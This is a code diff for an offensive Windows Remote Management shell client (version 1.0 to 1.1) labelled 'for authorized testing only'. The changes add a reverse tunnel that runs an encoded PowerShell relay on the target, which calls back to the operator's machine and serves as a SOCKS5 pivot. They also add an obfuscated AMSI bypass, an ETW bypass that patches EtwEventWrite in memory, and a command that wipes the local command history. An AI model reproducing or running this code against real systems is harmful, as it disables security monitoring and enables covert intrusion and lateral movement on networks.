+                    ['-NoP', '-NonI', '-Exec', 'Bypass', '-EncodedCommand', enc])
+                c.get_output(sid, cid)
+                c.close_shell(sid)
+                c.session.close()
+            except Exception:
+                pass
+
+        threading.Thread(target=run_relay, daemon=True).start()
+
+        try:
+            self.tunnel_sock, addr = self.listener.accept()
+            self.tunnel_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            self.tunnel_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 262144)
+            self.tunnel_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
+        except socket.timeout:
+            error(f"No reverse connection. Target cannot reach {self.kali_ip}:{self.tunnel_port}")
+            self.listener.close()
+            return False
+
+        frame = self._read_frame()
+        if not frame or frame[0] != self.READY:
+            error("Invalid handshake from relay")
+            self.tunnel_sock.close()
+            self.listener.close()
+            return False
+
+        good(f"Reverse tunnel from {addr[0]}")
+        self.listener.close()
+        self.listener = None
+
+        self.running = True
+        threading.Thread(target=self._tunnel_reader, daemon=True).start()
+
+        self.socks_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.socks_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.socks_server.bind(('127.0.0.1', self.listen_port))
+        self.socks_server.listen(20)
+        threading.Thread(target=self._socks_loop, daemon=True).start()
+
+        good(f"SOCKS5 on 127.0.0.1:{self.listen_port} (fast reverse tunnel)")
+        info("proxychains or --proxy socks5://127.0.0.1:" + str(self.listen_port))
+        return True
+
+    def stop(self):
+        self.running = False
+        if self.tunnel_sock:
+            try:
+                self.tunnel_sock.close()
+            except OSError:
+                pass
+        for sock in list(self.channels.values()):
+            try:
+                sock.close()
+            except OSError:
+                pass
+        self.channels.clear()
+        if self.socks_server:
+            try:
+                self.socks_server.close()
+            except OSError:
+                pass
+        if self.listener:
+            try:
+                self.listener.close()
+            except OSError:
+                pass
+        good("Reverse tunnel stopped")
+
+    @property
+    def active_count(self):
+        return len(self.channels)
+
+
+# -- Interactive Shell ---------------------------------------------------------
 
 class InteractiveShell(cmd.Cmd):
     def __init__(self, client, user, host, scripts_path=None,
@@ -775,6 +1367,7 @@ class InteractiveShell(cmd.Cmd):
         self.log_file = log_file
         self.loaded_functions = []
         self.socks_proxy = None
+        self.reverse_tunnel = None
         self._history_file = os.path.expanduser("~/.winrmshell_history")
         self._update_prompt()
 
@@ -782,9 +1375,12 @@ class InteractiveShell(cmd.Cmd):
         if NO_COLOR:
             self.prompt = f"PS {self.cwd}> "
         else:
+            rl = "\001"
+            re_ = "\002"
             self.prompt = (
-                f"{C.BOLD}{C.RED}WinRM{C.RESET} "
-                f"{C.YELLOW}PS{C.RESET} {C.CYAN}{self.cwd}{C.RESET}> "
+                f"{rl}{C.BOLD}{C.RED}{re_}WinRM{rl}{C.RESET}{re_} "
+                f"{rl}{C.YELLOW}{re_}PS{rl}{C.RESET}{re_} "
+                f"{rl}{C.CYAN}{re_}{self.cwd}{rl}{C.RESET}{re_}> "
             )
 
     def preloop(self):
@@ -841,15 +1437,39 @@ class InteractiveShell(cmd.Cmd):
             print(stdout)
             self._log(f"OUT: {stdout[:500]}")
         if stderr:
-            print(co(stderr, C.RED))
-            self._log(f"ERR: {stderr[:500]}")
+            # Filter out CLIXML progress messages (module loading noise)
+            cleaned = self._clean_clixml(stderr)
+            if cleaned.strip():
+                print(co(cleaned, C.RED))
+                self._log(f"ERR: {cleaned[:500]}")
+
+    @staticmethod
+    def _clean_clixml(text):
+        """Strip PowerShell CLIXML progress/verbose noise from stderr."""
+        # Remove the #< CLIXML header
+        text = text.replace("#< CLIXML\r\n", "").replace("#< CLIXML\n", "")
+        # Remove entire <Objs> blocks that only contain progress records
+        text = re.sub(
+            r'<Objs[^>]*>.*?</Objs>\s*',
+            '',
+            text,
+            flags=re.DOTALL,
+        )
+        return text.strip()
 
     def _try_reconnect(self):
         warn("Connection lost. Reconnecting...")
+        self.client.shell_id = None
         try:
-            self.client.shell_id = None
             self.client.open_shell()
             good("Reconnected")
+            return
+        except Exception:
+            pass
+        try:
+            self.client._rebuild_session()
+            self.client.open_shell()
+            good("Reconnected (new session)")
         except Exception as e:
             error(f"Reconnection failed: {e}")
 
@@ -863,7 +1483,7 @@ class InteractiveShell(cmd.Cmd):
         if current >= total:
             print()
 
-    # ── Default: execute as PowerShell ───────────────────────────────────
+    # -- Default: execute as PowerShell ----------------------------------------
 
     def default(self, line):
         if not line.strip():
@@ -873,7 +1493,7 @@ class InteractiveShell(cmd.Cmd):
     def emptyline(self):
         pass
 
-    # ── Built-in commands ────────────────────────────────────────────────
+    # -- Built-in commands -----------------------------------------------------
 
     def do_upload(self, args):
         """Upload a file: upload <local_path> <remote_path>"""
@@ -908,6 +1528,16 @@ class InteractiveShell(cmd.Cmd):
             self._log(f"DOWNLOAD: {remote_path} -> {local_path} ({size} bytes)")
         except WinRMError as e:
             error(f"Download failed: {e}")
+
+    def do_clearhistory(self, args):
+        """Clear the local command history and history file"""
+        if readline:
+            readline.clear_history()
+        try:
+            os.remove(self._history_file)
+        except OSError:
+            pass
+        good("History cleared")
 
     def do_services(self, args):
         """List Windows services"""
@@ -1044,7 +1674,7 @@ class InteractiveShell(cmd.Cmd):
         else:
             error(f"DLL load failed: {stderr.strip()}")
 
-    # ── Bypass commands ──────────────────────────────────────────────────
+    # -- Bypass commands -------------------------------------------------------
 
     def do_bypass(self, args):
         """Attempt AMSI bypass"""
@@ -1066,21 +1696,30 @@ class InteractiveShell(cmd.Cmd):
 
     def do_bypass_etw(self, args):
         """Patch EtwEventWrite in ntdll to disable ETW tracing"""
-        info("Running ETW bypass (patching EtwEventWrite)...")
-        # All sensitive strings are base64-encoded and decoded at runtime
-        # "ntdll"          -> bnRkbGw=
-        # "EtwEventWrite"  -> RXR3RXZlbnRXcml0ZQ==
-        ps = (
+        info("Running AMSI bypass + ETW bypass...")
+        # AMSI bypass first (same process) so AMSI won't scan the IEX content
+        amsi = (
             '$e=[Text.Encoding]::UTF8;'
-            '$k32=@"\nusing System;using System.Runtime.InteropServices;\n'
-            'public class K32{{\n'
+            '$t=[Ref].Assembly.GetType($e.GetString('
+            '[Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM=")));'
+            '$f=$t.GetField($e.GetString('
+            '[Convert]::FromBase64String("YW1zaUluaXRGYWlsZWQ=")),'
+            '"NonPublic,Static");'
+            '$f.SetValue($null,$true);'
+        )
+        # ETW bypass as base64 string decoded at runtime (after AMSI is disabled)
+        etw_code = (
+            '$k32=@"\n'
+            'using System;using System.Runtime.InteropServices;\n'
+            'public class K32{\n'
             '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);\n'
             '[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);\n'
             '[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);\n'
-            '}}\n"@;\n'
+            '}\n'
+            '"@;\n'
             'Add-Type $k32;'
-            '$m=$e.GetString([Convert]::FromBase64String("bnRkbGw="));'
-            '$p=$e.GetString([Convert]::FromBase64String("RXR3RXZlbnRXcml0ZQ=="));'
+            '$m=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("bnRkbGw="));'
+            '$p=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("RXR3RXZlbnRXcml0ZQ=="));'
             '$h=[K32]::LoadLibrary($m);'
             '$a=[K32]::GetProcAddress($h,$p);'
             '$o=0;'
@@ -1089,11 +1728,15 @@ class InteractiveShell(cmd.Cmd):
             '[K32]::VirtualProtect($a,[uint32]1,$o,[ref]$o)|Out-Null;'
             'Write-Output "ETW patched"'
         )
+        etw_b64 = base64.b64encode(etw_code.encode('utf-16-le')).decode()
+        ps = amsi + f'IEX([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("{etw_b64}")))'
+
         stdout, stderr, rc = self.client.execute_ps(ps)
         if rc == 0 and "patched" in (stdout or ""):
             good("ETW bypass successful -- EtwEventWrite returns immediately")
         else:
-            warn(f"ETW bypass may have failed: {(stderr or stdout or '').strip()}")
+            cleaned = self._clean_clixml(stderr or "")
+            warn(f"ETW bypass may have failed: {(cleaned or stdout or '').strip()}")
 
     def do_bypass_clm(self, args):
         """Attempt to escape PowerShell Constrained Language Mode"""
@@ -1158,7 +1801,7 @@ class InteractiveShell(cmd.Cmd):
 
         error("All CLM bypass methods failed -- likely enforced by WDAC/AppLocker policy")
 
-    # ── SOCKS proxy ──────────────────────────────────────────────────────
+    # -- SOCKS proxy -----------------------------------------------------------
 
     def do_socks(self, args):
         """SOCKS5 proxy: socks start [port] | socks stop | socks status"""
@@ -1192,14 +1835,52 @@ class InteractiveShell(cmd.Cmd):
         else:
             warn("Usage: socks start [port] | socks stop | socks status")
 
-    # ── Menu ─────────────────────────────────────────────────────────────
+    # -- Reverse tunnel --------------------------------------------------------
+
+    def do_tunnel(self, args):
+        """Fast reverse tunnel: tunnel start [port] [kali_ip] | stop | status"""
+        parts = args.strip().split()
+        action = parts[0].lower() if parts else "status"
+
+        if action == "start":
+            if self.reverse_tunnel and self.reverse_tunnel.running:
+                warn(f"Tunnel already running on port {self.reverse_tunnel.listen_port}")
+                return
+            port = int(parts[1]) if len(parts) > 1 else 1080
+            kali_ip = parts[2] if len(parts) > 2 else None
+
+            if self.socks_proxy and self.socks_proxy.running and self.socks_proxy.listen_port == port:
+                warn(f"WinRM SOCKS proxy using port {port}. Stop it first or pick another port.")
+                return
+
+            self.reverse_tunnel = ReverseTunnel(self.client, port)
+            if not self.reverse_tunnel.start(kali_ip):
+                self.reverse_tunnel = None
+
+        elif action == "stop":
+            if self.reverse_tunnel and self.reverse_tunnel.running:
+                self.reverse_tunnel.stop()
+                self.reverse_tunnel = None
+            else:
+                warn("No tunnel running")
+
+        elif action == "status":
+            if self.reverse_tunnel and self.reverse_tunnel.running:
+                info(f"Reverse tunnel SOCKS5 on 127.0.0.1:{self.reverse_tunnel.listen_port}")
+                info(f"Active channels: {self.reverse_tunnel.active_count}")
+            else:
+                info("No tunnel running. Start with: tunnel start [port] [kali_ip]")
+        else:
+            warn("Usage: tunnel start [port] [kali_ip] | tunnel stop | tunnel status")
+
+    # -- Menu ------------------------------------------------------------------
 
     def do_menu(self, args):
         """Show available commands"""
         print()
-        print(co("  ╔═══════════════════════════════════════════════════════════════╗", C.CYAN))
-        print(co("  ║", C.CYAN) + co("                 WinRM Shell Commands", C.BOLD + C.WHITE) + co("                       ║", C.CYAN))
-        print(co("  ╠═══════════════════════════════════════════════════════════════╣", C.CYAN))
+        print(co("  +===============================================================+", C.CYAN))
+        print(co("  |", C.CYAN) + co("                 WinRM Shell Commands", C.BOLD + C.WHITE) + co("                       |", C.CYAN))
+        print(co("  +===============================================================+", C.CYAN))
         cmds = [
             ("upload",         "Upload file: upload <local> <remote>"),
             ("download",       "Download file: download <remote> [local]"),
@@ -1209,7 +1890,8 @@ class InteractiveShell(cmd.Cmd):
             ("bypass",         "AMSI bypass (patch amsiInitFailed)"),
             ("bypass-etw",     "ETW bypass (patch EtwEventWrite)"),
             ("bypass-clm",     "CLM bypass (escape ConstrainedLanguage)"),
-            ("socks",          "SOCKS5 proxy: start [port] / stop / status"),
+            ("socks",          "SOCKS5 proxy (over WinRM): start/stop/status"),
+            ("tunnel",         "Fast reverse tunnel: start [port] [ip]/stop"),
             ("services",       "List Windows services"),
             ("processes",      "List running processes"),
             ("menu",           "Show this menu"),
@@ -1217,14 +1899,18 @@ class InteractiveShell(cmd.Cmd):
         ]
         for name, desc in cmds:
             n = co(f"  {name:<18}", C.YELLOW)
-            print(co("  ║ ", C.CYAN) + n + f" {desc:<42}" + co("║", C.CYAN))
-        print(co("  ╠═══════════════════════════════════════════════════════════════╣", C.CYAN))
-        print(co("  ║", C.CYAN) + "  Anything else is executed as PowerShell" + co("                   ║", C.CYAN))
-        print(co("  ╚═══════════════════════════════════════════════════════════════╝", C.CYAN))
+            print(co("  | ", C.CYAN) + n + f" {desc:<42}" + co("|", C.CYAN))
+        print(co("  +===============================================================+", C.CYAN))
+        print(co("  |", C.CYAN) + "  Anything else is executed as PowerShell" + co("                   |", C.CYAN))
+        print(co("  +===============================================================+", C.CYAN))
         print()
 
     def do_exit(self, args):
         """Exit the shell"""
+        if self.reverse_tunnel and self.reverse_tunnel.running:
+            info("Stopping reverse tunnel...")
+            self.reverse_tunnel.stop()
+            self.reverse_tunnel = None
         if self.socks_proxy and self.socks_proxy.running:
             info("Stopping SOCKS proxy...")
             self.socks_proxy.stop()
@@ -1242,7 +1928,7 @@ class InteractiveShell(cmd.Cmd):
         print()
         return self.do_exit(args)
 
-    # ── Tab completion ───────────────────────────────────────────────────
+    # -- Tab completion --------------------------------------------------------
 
     def complete_upload(self, text, line, begidx, endidx):
         return self._complete_local_path(text)
@@ -1270,6 +1956,10 @@ class InteractiveShell(cmd.Cmd):
         return self._complete_local_path(text)
 
     def complete_socks(self, text, line, begidx, endidx):
+        options = ["start", "stop", "status"]
+        return [o for o in options if o.startswith(text.lower())]
+
+    def complete_tunnel(self, text, line, begidx, endidx):
         options = ["start", "stop", "status"]
         return [o for o in options if o.startswith(text.lower())]
 
@@ -1305,7 +1995,7 @@ class InteractiveShell(cmd.Cmd):
                 print()
                 continue
 
-    # ── Handle hyphenated command names ──────────────────────────────────
+    # -- Handle hyphenated command names ----------------------------------------
 
     def parseline(self, line):
         line = line.strip()
@@ -1320,14 +2010,14 @@ class InteractiveShell(cmd.Cmd):
         return super().parseline(line)
 
 
-# ── Banner & entry point ────────────────────────────────────────────────────
+# -- Banner & entry point -----------------------------------------------------
 
 BANNER = r"""
 {bold}{red}
     ╦ ╦┬┌┐┌╦═╗╔╦╗  ╔═╗┬ ┬┌─┐┬  ┬
     ║║║││││╠╦╝║║║  ╚═╗├─┤├┤ │  │
     ╚╩╝┴┘└┘╩╚═╩ ╩  ╚═╝┴ ┴└─┘┴─┘┴─┘{reset}
-    {cyan}Custom WinRM Client v1.0{reset}
+    {cyan}Custom WinRM Client v1.1{reset}
     {yellow}For authorized testing only{reset}
 """
 
@@ -1382,11 +2072,14 @@ def main():
                       help="Log commands to file")
     feat.add_argument("--no-colors", action="store_true",
                       help="Disable colored output")
+    feat.add_argument("--debug", action="store_true",
+                      help="Print raw SOAP responses on errors")
 
     args = parser.parse_args()
 
-    global NO_COLOR
+    global NO_COLOR, DEBUG
     NO_COLOR = args.no_colors
+    DEBUG = args.debug
 
     print_banner()
 
